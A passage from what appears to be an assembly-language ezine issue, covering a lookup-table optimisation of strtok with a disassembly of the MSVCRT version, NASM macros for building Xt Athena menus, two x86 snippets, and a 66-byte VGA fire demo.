+restored from where it was saved on the previous call. (One value is saved for
+each thread, not for each process, so it can't be stored in the .data segment).
+
+Then we enter the first loop, Phase1. Here characters are read until one is
+found that does NOT belong to s2 (then jump to Phase2) or the terminating NULL
+is reached (then just return NULL). Every character read from s1 is compared
+against all characters in s2 (in the Scan1 loop).
+
+The second loop, Phase2 (if we reach it), reads characters from s1 until one is
+found that belongs to s2 (then replace it with a NULL, return) or the
+terminating NULL is reached (then just return).
+
+Actually before entering Phase2, the pointer to the current char in s1 is saved,
+and it is returned in EAX as the return value.
+
+Notice that the string s1 is modified by strtok.
+
+
+
+III. ESTIMATING PERFORMANCE
+---------------------------
+
+As noted in the introduction, the speed of _strtok can't be calculated in a
+'k+l*n' way. So a more general 'speed' is estimated:
+
+The above _strtok function is really slow for three reasons:
+1. '__thread_data' calls various other functions, slowing code down.
+   (actually, this does not exist in the single-thread library)
+2. The code is not pentium-optimized, not optimized at all I'd say.
+3. The algorithm used is REALLY bad.
+
+Reason 3 is the most important. Even the fastest code written to use this
+algorithm would be slow. The reason is that there are two NESTED loops, one to
+find the first character of the token and one to find the first delimiter.
+Supposing that s1 does not start with a delimiter, then to get the first token,
+each character of the token is compared to EVERY character of s2. This means
+that if the first token of s1 is 10 characters long, and s2 contains 10
+delimiter characters, at least 10*10=100 loop cycles are needed. Try duplicating
+s2, to be 20 characters long. Without adding information, 10*20=200 loop cycles
+are needed now.
+
+
+
+IV. THE LOOKUP TABLE
+--------------------
+
+To get rid of the nested loops, the function must have a 'direct' way of knowing
+if a character (read from s1) exists in s2. This is accomplished through a
+lookup table, i.e. a region of memory holding, for each of the 256 different
+characters, a value that indicates if that character is a delimiter. So the
+function will consist of one loop scanning s2 and setting values in the lookup
+table, and another one scanning s1 and comparing it's values against the lookup
+table.
+
+Some considerations regarding the lookup table must be made:
+- First of all, forget Unicode. No one would like a lookup table with 65536
+entries...
+- The values in the table can be either bits or bytes. It's easier and faster to
+access the values in a byte-sized table, but it takes more time to reset the
+lookup table each time the function is called
+- The lookup table can be either local (stack) or global (.data segment). The 32
+bytes needed create no problems in either place. It is faster to have a local
+table (for various reasons), and it's also more reasonable. Yet a global lookup
+table allows for an interesting extension to _strtok:
+    It is common to use the same s2 string many times. By using a global table,
+    which is preserved across calls, the caller may pass NULL as s2, to reuse
+    the last lookup table. This way a lookup table is calculated only once.
+    For a more specific application, where speed is essential, but instead of
+    only one delimiter string, there are more, the function can be improved to
+    receive, instead of s2, a pointer to a lookup table, either built in or
+    created by another function
+
+In this essay we'll stick to the 'normal' strtok, using a local table.
+This is also the way _strtok is implemented in MSVCRT (with bit values). See for
+yourselves:
+
+
+
+V. STRTOK IN MSVCRT
+-------------------
+
+strtok  proc near
+
+lookup  = byte ptr -20h
+a_s1    = dword ptr  4
+a_s2    = dword ptr  8
+
+        sub     esp, 20h
+        push    ebx
+        push    ebp
+        mov     ebp, [esp+28h+a_s2]     ; EBP points at s2
+        push    esi
+        push    edi
+        call    GetTls
+        mov     edx, eax
+        mov     ecx, 8
+        xor     eax, eax
+        lea     edi, [esp+30h+lookup]
+        mov     [esp+30h+a_s2], edx     ; save in a_s2 the value by GetTls
+        repe stosd                      ; reset lookup table
+
+; Loop1 : scan s2 and set lookup table values
+
+loop1:  mov     al, [ebp+0]
+        mov     bl, 1
+        mov     ecx, eax
+        and     ecx, 0FFh
+        mov     esi, ecx
+        and     ecx, 7
+        shr     esi, 3
+        shl     bl, cl
+        mov     cl, [esp+esi+30h+lookup]
+        lea     esi, [esp+esi+30h+lookup]
+        or      cl, bl
+        inc     ebp
+        test    al, al
+        mov     [esi], cl
+        jnz     short loop1
+
+        mov     esi, [esp+30h+a_s1]     ; ESI points at s1
+        test    esi, esi
+        jnz     short skip
+        mov     esi, [edx+18h]          ; s1 NULL, restore previous
+
+skip:   mov     dl, [esi]
+        mov     eax, 1
+        mov     edi, edx
+        and     edi, 0FFh
+        mov     ecx, edi
+        and     ecx, 7
+        shl     eax, cl
+        shr     edi, 3
+        mov     cl, [esp+edi+30h+lookup]
+        test    cl, al
+        jz      short exit2
+;
+; Loop2 : find first non delimiter, or NULL
+
+loop2:  test    dl, dl
+        jz      short exit2
+        mov     dl, [esi+1]
+        inc     esi
+        mov     eax, edx
+        mov     ebx, 1
+        and     eax, 0FFh
+        mov     ecx, eax
+        and     ecx, 7
+        shl     ebx, cl
+        shr     eax, 3
+        mov     al, [esp+eax+30h+lookup]
+        test    al, bl
+        jnz     short loop2
+
+exit2:  mov     al, [esi]
+        mov     edi, esi
+        test    al, al
+        jnz     short enter3
+        jmp     short exit3             ; NULL found, return NULL
+; ---------------------------------------------------------------------
+
+; Loop3 : Find delimiter marking the end of the token
+
+loop3:  mov     al, [esi+1]
+        inc     esi
+        test    al, al
+        jz      short exit3
+
+enter3: and     eax, 0FFh
+        mov     edx, 1
+        mov     ecx, eax
+        and     ecx, 7
+        shl     edx, cl
+        shr     eax, 3
+        mov     al, [esp+eax+30h+lookup]
+        test    al, dl
+        jz      short loop3
+        mov     byte ptr [esi], 0       ; mark the end of token
+        inc     esi                     ; point s1 to next char
+
+exit3:  mov     ecx, [esp+30h+a_s2]     ; value by GetTls
+        mov     eax, edi
+        sub     eax, esi
+        neg     eax
+        sbb     eax, eax
+        mov     [ecx+18h], esi          ; store pointer for next call
+        and     eax, edi
+        pop     edi
+        pop     esi
+        pop     ebp
+        pop     ebx
+        add     esp, 20h
+        retn
+strtok  endp
+
+GetTls is a function in MSVCRT.DLL that uses GetTlsValue to get thread storage
+space. The layout is rather easy to understand, the 'bit-fiddling' to access the
+values in the lookup table is a bit complicated. But it's rather good code. Yet
+it can be optimized even more at a low level.
+
+
+
+VI. FINAL VERSIONS
+------------------
+
+This is the final version using bit values in the lookup table:
+
+.data
+masks   db 1,2,4,8,16,32,64,128
+
+.code
+_strtok proc
+        push    edi
+        push    ebx
+        xor     eax, eax
+        mov     edi, [esp+16]   ; s2 [delimiters]
+
+  rept 7
+        push    eax             ; reset table
+  endm
+        push    1               ; set NULL as a separator
+
+        mov     al, [edi]
+        inc     edi
+        or      al, al
+        jz      skip1
+        mov     ecx, eax
+        mov     ebx, eax
+
+loop1:  shr     ebx, 3
+        and     ecx, 7
+        mov     al, [edi]
+        inc     edi
+        mov     dl, masks[ecx]
+        mov     ah, [esp+ebx]
+        mov     cl, al
+        or      dl, ah
+        mov     [esp+ebx], dl
+        mov     bl, al
+        or      al, al
+        jnz     loop1
+
+skip1:  mov     edi, [esp+44]   ; s1 [string]
+        xor     eax, eax
+
+        test    edi, edi
+        jnz     short loop2
+        mov     edi, [pointer]
+
+loop2:  mov     cl, [edi]
+        inc     edi
+        mov     ebx, ecx
+        and     ecx, 7
+        or      bl, bl
+        jz      short nomore    ; no more tokens, return NULL
+        shr     ebx, 3
+        mov     cl, masks[ecx]
+        test    [esp+ebx], cl
+        jnz     short loop2
+
+        lea     eax, [edi-1]    ; this is the return value
+
+loop3:  mov     cl, [edi]
+        mov     ebx, ecx
+        and     ecx, 7
+        shr     ebx, 3
+        inc     edi
+        mov     cl, masks[ecx]
+        test    [esp+ebx], cl
+        jz      short loop3
+
+        mov     cl, [edi-1]
+return: mov     byte ptr [edi-1], 0
+nomore: cmp     cl, 1
+        sbb     edi, 0
+        mov     [pointer], edi
+        add     esp, 20h
+        pop     ebx
+        pop     edi
+        retn
+_strtok endp
+
+Again, the general layout is rather simple (same as in MSVCRT) . The bit
+fiddling is even 'stranger', and the instruction order is a bit weird, in order
+to achieve optimum pairing. But it runs at about more than twice the speed
+msvcrt does.
+
+The main features of this version are:
+-Space in the stack is allocated by PUSHing 8 times (PUSH pairs with itself, so
+it only takes 4 cycles to allocate and clear the table)
+-8 bytes in the .data segment contain the masks used to acces bits 0 to 7 in a
+byte, thus allowing faster bit-value access.
+-It works, and it works FAST.
+
+A little bit faster (not always, though, since memory access is more intense) is
+this version with byte values in the lookup table:
+
+_strtok proc
+        xor     ecx, ecx
+        mov     edx, [esp+8]    ; s2 [delimiters]
+
+  rept 63
+        push    ecx             ; reset table
+  endm
+        push    1               ; set NULL as a separator
+
+        mov     cl, [edx]
+        inc     edx
+        or      cl, cl
+        jz      skip1
+
+loop1:  mov     byte ptr [esp+ecx], 1
+        mov     cl, [edx]
+        inc     edx
+        or      cl, cl
+        jnz     loop1
+
+
+skip1:  mov     edx, [esp+4+256] ; s1 [string]
+        xor     eax, eax
+
+        test    edx, edx
+        jnz     short loop2
+        mov     edx, [pointer]
+
+loop2:  mov     cl, [edx]
+        inc     edx
+        or      cl, cl
+        jz      short nomore    ; no more tokens, return NULL
+        cmp     byte ptr [esp+ecx], 1
+        je      short loop2
+
+        lea     eax, [edx-1]    ; this is the return value
+        nop
+
+loop3:  mov     cl, [edx]
+        inc     edx
+        cmp     byte ptr [esp+ecx], 1
+        jne     short loop3
+
+return: mov     byte ptr [edx-1], 0
+nomore: cmp     cl, 1
+        sbb     edx, 0
+        mov     [pointer], edx
+        add     esp, 256
+        retn
+_strtok endp
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::............................................THE.UNIX.WORLD
+                                                              Using Menus in Xt
+                                                              by mammon_
+
+
+A simple one-button application will not get you very far in the X world. A
+good application must have multiple components, including menus, dialog boxes,
+application windows, and accelerators. In this article I will present the use
+of Xt menus in assembly language as a first step towards producing a complete
+application; future articles will cover the integration of forms, dialog
+boxes, and other resources into a complete application.
+
+I presented some Xt macros for Nasm last issue, but have revised them after a
+bit more testing. The CALLBACK macros have been rewritten, and an InitXtApp
+macro has been written as well to take care of the generic Xt application
+startup code.
+;=======================================================================-xt.inc
+%macro InitXtApp 5
+;------Usage:    InitXtApp TopLevelWidget, Context, ClassName, ARGC, ARGV
+EXTERN XtVaAppInitialize
+	push dword 0
+	push dword 0
+	push dword 0
+        push dword %5
+	push dword %4
+	push dword 0
+	push dword 0
+	push dword %3
+        push dword %2
+	call XtVaAppInitialize
+	add esp, 36
+	mov [%1], eax
+%endmacro
+
+%macro CALLBACK 1
+;------Usage:   CALLBACK name
+GLOBAL %1
+%1:
+%define CallData 	[ebp+8]
+%define ClientData 	[ebp+12]
+%define Widget		[ebp+16]
+	push ebp
+	mov ebp, esp
+%endmacro
+
+%macro CALLBACK_RETURN 0
+;------Usage:          CALLBACK_RETURN
+	mov  esp, ebp
+	pop  ebp
+	ret
+%endmacro
+
+%macro ShowXtWidget 1
+;------Usage:       ShowXtWidget Widget
+EXTERN XtRealizeWidget
+	push dword [%1]
+	call XtRealizeWidget
+	add esp, 4
+%endmacro
+
+%macro XtAppLoop 1
+;------Usage:    XtAppLoop Context
+EXTERN exit
+EXTERN XtAppMainLoop
+	push dword [%1]
+	call XtAppMainLoop
+	add  esp, 4
+	push dword 0
+	call exit
+%endmacro
+;==============================================================================
+ The first thing that must be done in creating an application menu is to
+ create a "menubar" that will contain the component menu buttons. This often
+ takes the place of a Box or Form widget that resides on the top or left edge
+ of an application. The menu bar will later be "filled" with a button for each
+ menu [e.g. File, Edit, Options, Help].
+
+ I have opted to use the Box widget for the menubar as it requires less
+ initialization than the Form widget; normally it defaults to a vertical
+ stacking of the component buttons, but this can be fixed with further
+ configuration and will be addresses in a future article.
+
+ To create a menubar widget I have create a macro which will simply create a
+ Box widget; it takes as its parameters a pointer to the parent widget
+ [usually the top-level widget], the name of the menubar class, and a dword
+ variable which will become a pointer to the Box instance:
+;=======================================================================-xt.inc
+%macro CreateMenuBar 3
+;------Usage:        CreateMenuBar ParentWidget, ClassName, MenubarWidget
+EXTERN boxWidgetClass
+EXTERN XtCreateManagedWidget
+	push dword 0
+	push dword 0
+        push dword [%1]
+	push dword [boxWidgetClass]
+        push dword %2
+	call XtCreateManagedWidget
+        mov  [%3], eax
+	add esp, 20
+%endmacro
+
+;==============================================================================
+Following this, a button must be created for each menu as a component of the
+Box or menubar widget. Each button is then associated with a Menu widget
+through the XtCreatePopupShell call.
+
+In Xt Athena, a menu is a button which, when pressed, creates a "Popup Shell";
+that is, a container which contains the various menu items. These items are
+known as smeObjectClasses, or "simple menu entry" objects; selecting a simple
+menu entry from the popup shell [in plain English, "selecting a menu item"]
+will cause the callback for that menu item to be invoked and any data
+associated with the menu to be sent to the callback.
+
+The AddMenu macro will create a menu button and popup shell for a given menu;
+it takes as its parameters the pointer to the parent Menubar widget, the ASCII
+string to be displayed in the menu [e.g. "File", "Edit", etc], a dword
+variable to be filled with a pointer to the menu button, and a dword variable
+to be filled with a pointer to the menu [or "popup shell"] itself:
+;=======================================================================-xt.inc
+%macro AddMenu 4
+;------Usage:  AddMenu  MenubarWidget, MenuText, MenuButtonWidget, MenuWidget
+%ifndef _menu_classname
+EXTERN menuButtonWidgetClass
+EXTERN XtCreateManagedWidget
+EXTERN simpleMenuWidgetClass
+EXTERN XtCreatePopupShell
+[section .data]
+_menu_class	db	"menu",0
+[section .text]
+%define _menu_classname
+%endif
+	push dword 0
+	push dword 0
+	push dword [%1]
+	push dword [menuButtonWidgetClass]
+	push dword %2
+	call XtCreateManagedWidget
+	mov  [%3], eax
+	add esp, 20
+
+	push dword 0
+	push dword 0
+	push dword [%3]
+	push dword [simpleMenuWidgetClass]
+	push dword _menu_class
+	call XtCreatePopupShell
+	mov  [%4], eax
+	add  esp, 20
+%endmacro
+;==============================================================================
+Once the menu is created, it must be filled with menu items. The standard menu
+item is an smeBSBObject, meaning "simple menu entry: Bitmap-String-Bitmap";
+that is, each line can consist of a bitmap followed by a string followed by a
+bitmap. This can be useful for providing "visual"/eyecandy menus, or for
+checking and unchecking [via an "x" bitmap] menu items. For this example, I am
+using only string menu entries.
+
+Menu items are added with the standard CreateManagedWidget function, then
+associated with a callback routine just like standard Xt widgets. The
+AddMenuItem macro performs both of these functions and takes as its parameters
+the pointer to the parent Menu, the text to be displayed in the menu item, a
+pointer to the data associated with the menu item, and the address of the
+callback routine:
+;=======================================================================-xt.inc
+%macro AddMenuItem 4
+;------Usage:      AddMenuItem MenuWidget, MenuItemText, MenuItemID, Callback
+%ifndef menu_entry_ptr
+EXTERN smeBSBObjectClass
+EXTERN XtCreateManagedWidget
+EXTERN XtAddCallback
+[section .data]
+MenuEntry:
+.ptr		dd	0
+_callback_type	db	"callback",0
+[section .text]
+%define menu_entry_ptr
+%endif
+	push dword 0
+	push dword 0
+	push dword [%1.ptr]
+	push dword [smeBSBObjectClass]
+	push dword %2
+	call XtCreateManagedWidget
+	mov [MenuEntry.ptr], eax
+	add esp, 20
+
+	push dword %3
+	push dword %4
+	push dword _callback_type
+	push dword [MenuEntry.ptr]
+	call XtAddCallback
+	add  esp, 16
+%endmacro
+;==============================================================================
+Note that the pointer to the Menu Item Entry widget is needed only to install
+the callback, and can then be discarded.
+
+I have also included a separator menu  item to break up the menus a bit; this
+is simply a menu item of class smeLineObject which does nothing; as such, the
+AddMenuSeparator macro requires only the pointer to the parent Menu as a
+parameter:
+;=======================================================================-xt.inc
+%macro AddMenuSeparator 1
+;------Usage:           AddMenuSeparator MenuWidget
+%ifndef _szseperator
+EXTERN smeLineObjectClass
+EXTERN XtCreateManagedWidget
+[section .data]
+_szSep	db	"line",0
+[section .text]
+%define _szseperator
+%endif
+	push dword 0
+	push dword 0
+	push dword [%1.ptr]
+	push dword [smeLineObjectClass]
+        push dword _szSep
+	call XtCreateManagedWidget
+	mov [MenuEntry.ptr], eax
+	add esp, 20
+%endmacro
+;==============================================================================
+Why so many macros? To ease the tedium. The Xt code presented below was many
+pages longer before I converted the menu creation routines --which run 10 to
+20 lines apiece-- into macros. Also, looking at the sample application, you
+will see that all of the "generic" Xt code has been compressed to a few lines,
+leaving the bulk of the "real code" in the callback routine and in the
+resource definitions.
+
+I have chosen to use a single callback for all of the menu items; this is the
+most simple and perhaps the most efficient method. Each menu entry has a
+unique integer ID which is passed to the callback as data when the menu item
+is selected; the callback compares its incoming ClientData variable with each
+of the menu entry IDs until it finds a match, whereupon it jumps to a specific
+subroutine for each different ID. In short, a typical message handler --
+though I refrained from my notorious call-table and SWITCH/CASE macros in this
+case for the sake of clarity.
+
+The structure of the Widget declarations in this file could also bear some
+discussion. I have chosen to treat all widgets declared in the application
+[*not* references to the external widget classes reference by the app, but
+rather the pointers to those classes] as primitive structures of the following
+form:
+WidgetInstance:
+.ptr    dd      0
+.name   db      'name',0
+This makes things easier, for the widget pointer can now be referred to as
+[WidgetInstance.ptr], and the widget name can be referred to as
+WidgetInstance.name. Notice that all widget pointers must be referenced in
+brackets; the typical C use of a pointer is to pass the address contained in
+the pointer, not the address of the pointer itself [unless the pointer is
+dereferenced by a "&", in which case the brackets should not be used in the
+assembly language equivalent].
+
+The menu widgets have a similar, but more advanced syntax:
+MenuName:
+.ptr
+.name
+.button
+.Entryname
+.EntrynameID
+This allows the pointer for each menu button to be stored along with the rest
+of the menu data, and also allows menu entries to be referenced as "members"
+of the menu "structure", e.g. MenuName.Entryname would be the text of the menu
+item, and MenuName.EntrynameID would be the integer ID for the menu item.
+
+Now for the actual implementation:
+;===================================================================-xtmenu.asm
+BITS 32
+EXTERN exit
+EXTERN printf
+%include "Xt.inc"
+;==========================================================================DATA
+[section .data]
+;______________Widgets__________________________
+Shell:
+.ptr		dd	0
+.name		db	"shell",0
+MenuBar:
+.ptr		dd	0
+.name		db	"menubar",0
+
+;_______________Menus___________________________
+FileMenu:
+.ptr		dd	0
+.name		db	"File",0
+.button		dd	0
+.New		db	"New",0
+.NewID		dd	"101"
+.Open		db	"Open",0
+.OpenID		dd	"102"
+.Save		db	"Save",0
+.SaveID		dd	"103"
+.Close		db	"Close",0
+.CloseID 	dd	104
+.Exit		db	"Exit",0
+.ExitID		dd	105
+
+HelpMenu:
+.ptr		dd	0
+.name		db	"Help",0
+.button		dd	0
+.About		db	"About",0
+.AboutID 	dd	201
+
+;____Classes____________________________________
+XtMenu:		db	"XtMenu",0
+
+;____Misc_______________________________________
+ARGC:	times 128 db	0
+szOutString	db	"%s selected",0ah,0dh,0
+AppContext	dd	0
+
+;==========================================================================CODE
+[section .text]
+CALLBACK CBMenuSelect
+	mov ebx, ClientData
+	mov eax, [ebx]
+	cmp eax, dword [FileMenu.NewID]
+	je  MenuNew
+	cmp eax, dword [FileMenu.OpenID]
+	je  MenuOpen
+	cmp eax, dword [FileMenu.SaveID]
+	je  MenuSave
+	cmp eax, dword [FileMenu.CloseID]
+	je  MenuClose
+	cmp eax, dword [FileMenu.ExitID]
+	je  MenuExit
+	cmp eax, dword [HelpMenu.AboutID]
+	je  MenuAbout
+	jmp unhandled
+MenuNew:
+	push dword FileMenu.New
+	jmp do_printf
+MenuOpen:
+	push dword FileMenu.Open
+	jmp do_printf
+MenuSave:
+	push dword FileMenu.Save
+	jmp do_printf
+MenuClose:
+	push dword FileMenu.Close
+	jmp do_printf
+MenuAbout:
+	push dword HelpMenu.About
+do_printf:
+	push dword szOutString
+	call printf
+	add  esp, 8
+unhandled:
+	CALLBACK_RETURN
+MenuExit:
+	mov  esp, ebp
+	pop  ebp
+	push dword 0
+	call exit
+	ret
+;____________________________________________________________PROGRAM_ENTRYPOINT
+GLOBAL main
+main:
+        InitXtApp Shell.ptr, AppContext, XtMenu, ARGC, 0
+
+;-------Make Menu
+	CreateMenuBar Shell.ptr, MenuBar.name, MenuBar.ptr
+	AddMenu MenuBar.ptr, FileMenu.name,FileMenu.button, FileMenu.ptr
+	AddMenu MenuBar.ptr, HelpMenu.name,HelpMenu.button, HelpMenu.ptr
+
+;-------Build File Menu
+	AddMenuItem FileMenu, FileMenu.New, FileMenu.NewID, CBMenuSelect
+	AddMenuItem FileMenu, FileMenu.Open, FileMenu.OpenID, CBMenuSelect
+	AddMenuItem FileMenu, FileMenu.Save, FileMenu.SaveID, CBMenuSelect
+	AddMenuItem FileMenu, FileMenu.Close, FileMenu.CloseID, CBMenuSelect
+        AddMenuSeparator FileMenu
+	AddMenuItem FileMenu, FileMenu.Exit, FileMenu.ExitID, CBMenuSelect
+;-------Build Help Menu
+	AddMenuItem HelpMenu, HelpMenu.About, HelpMenu.AboutID, CBMenuSelect
+
+;-------Show Top-Level Widget
+	ShowXtWidget Shell.ptr
+;-------Enter Xt Application Loop
+	XtAppLoop AppContext
+
+    ;___Compile_Strings_________________________________________
+    ;   nasm -f elf xtmenu.asm
+    ;   gcc -o xtmenu xtmenu.o -lXaw -lXt -lX11 -L/usr/X11R6/lib
+;==========================================================================-EOF
+The strings needed to compile and link Xt assembly apps are provided at the
+end of the file. Note once again how short the main application code is; the
+menu data could easily be moved into an xtmenu.inc file and thereby trim the
+"apparent size" of the application down to the initialization code and the
+callback.
+
+Further automation could involve creating a "resource editor" which would
+produce .INC files compatible with the Xt.inc macros, as well as creating
+high-level calls to automatically adjust the stack and high-level structures
+to deal with message handling in the callback.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::................................ASSEMBLY.LANGUAGE.SNIPPETS
+                                                               Triple XOR
+                                                               by Jan Verhoeven
+;Summary: exchange the contents of two registers using
+;         as few storage locations as possible
+;Compatibility: all x86 assemblers
+;Notes: Will work for memory locations, etc
+        xor     ax, bx
+        xor     bx, ax
+        xor     ax, bx
+
+			 				       Trailing Calls
+							       by Jan Verhoeven
+;This is really more of a trick than a snippet. It is quite common to come
+;across code such as
+                cmp     ax, [Sector][2]
+                jne     >L0
+                inc     ax
+        L0:     call    TestDrive
+                ret
+;This amounts to two ret's, one in the above code and one in the TestDrive
+;routine. To save a bit of space and overhead, we can make use of TestDrive's
+;ret to return from our own routine:
+                cmp     ax, [Sector][2]
+                jne     >L0
+                inc     ax
+	L0:     jmp     TestDrive
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................ISSUE.CHALLENGE
+                                           	       Fire Demo in < 100 bytes
+                                                       by iCE
+
+
+ [Another preface, I must be getting wordy in my old age. I received this code
+  from iCE as a potential snippet or challenge; I chose to include it as the
+  latter, for it put a nice spin on one of the classic asm learning programs:
+  the VGA fire demo.
+
+  I have not pushed iCE for a commentary as the code is rather clear; it produces
+  a small greyscale fire [roughly a third of the screen in my DOS VMWare box] that
+  runs until a key is pressed. The key is using the greyscale as a sort of dynamic
+  palette; this eliminates the need for a costly color palette that is easily 100
+  bytes itself. Although to be sure, the program now runs the risk of being renamed
+  "static.asm" ;)
+
+  _m            ]
+
+
+; 66 bytes Graphic Fire demo.
+; assemble using 'Tasm FIRE.ASM' and 'Tlink /t FIRE.OBJ'
+;======================================================================FIRE.ASM
+.MODEL TINY
+.CODE
+.386
+ORG 100H
+START:
+
+	push	0a000h
+	pop     es
+	push    es
+	pop	ds
+
+	mov     al,13h          ; mode 13h. (AX=0)
+	int     10h
+
+				; gray-scale routine
+	mov     dx,3c8h
+	CBW			; set ax=0
+	out     dx,al
+	inc     dx
+	gs_loop:
+	out	dx,al
+	out	dx,al
+	out	dx,al
+	inc	ax
+	jnz	short gs_loop
+
+;---
+MainLoop:
+	mov     si,1280		;
+	mov     ch,5dh		; y-pos, the less the faster demo
+	push	si
+	push	cx
+
+Sloop:
+	lodsb
+	add     al,[si]		; pick color and
+	add     al,[si+320]	; pick one more and
+	shr     al,2		; divide, we got a
+				; 'smooth-fire-routine'
+
+	mov	[si-960],al	; put color
+	loop	short Sloop
+
+	pop	di
+	pop	cx
+
+
+
+Randoml:
+	mul	word ptr [di+1]	; 'random' routine.
+	inc	ax
+	stosw
+	loop	short Randoml
+
+	MOV     AH,1		; check keypress
+	INT     16h
+	Jz	short MainLoop
+
+;---
+Die:
+	mov     ax,3		; text-mode
+	int     10h
+	ret			; A com program may end using ret
+END	start
+;==========================================================================-EOF
+
+
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::.......................................................FIN
